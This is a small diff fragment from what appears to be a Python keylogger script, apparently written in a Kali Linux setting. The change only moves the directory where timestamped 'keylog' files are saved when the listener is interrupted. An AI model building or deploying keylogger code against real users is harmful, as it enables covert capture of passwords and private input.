@@ -38,7 +38,7 @@ try:
     listener.start()
     listener.join()
 except KeyboardInterrupt:
-    log_dir = "/home/kali/Desktop/"
+    log_dir = "/home/kali/Tr4ce/"
     filename = "keylog-" + datetime.now().strftime("%Y-%m-%d_%H-%M-%S") + ".txt"
     filepath = log_dir + filename
 
